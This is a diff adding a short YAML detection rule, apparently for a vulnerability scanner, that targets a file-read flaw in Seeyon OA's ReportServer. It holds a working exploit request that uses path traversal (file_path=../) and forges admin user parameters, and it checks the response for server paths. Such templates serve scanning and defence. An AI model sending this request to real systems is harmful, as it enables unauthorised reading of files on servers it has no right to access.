@@ -1,0 +1,13 @@
+name: 致远OA-ReportServer-文件读取
+description: >-
+  文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true
+    expression:
+      status: 200
+      body_all:
+        - "/seeyon"
+        - "envPath="
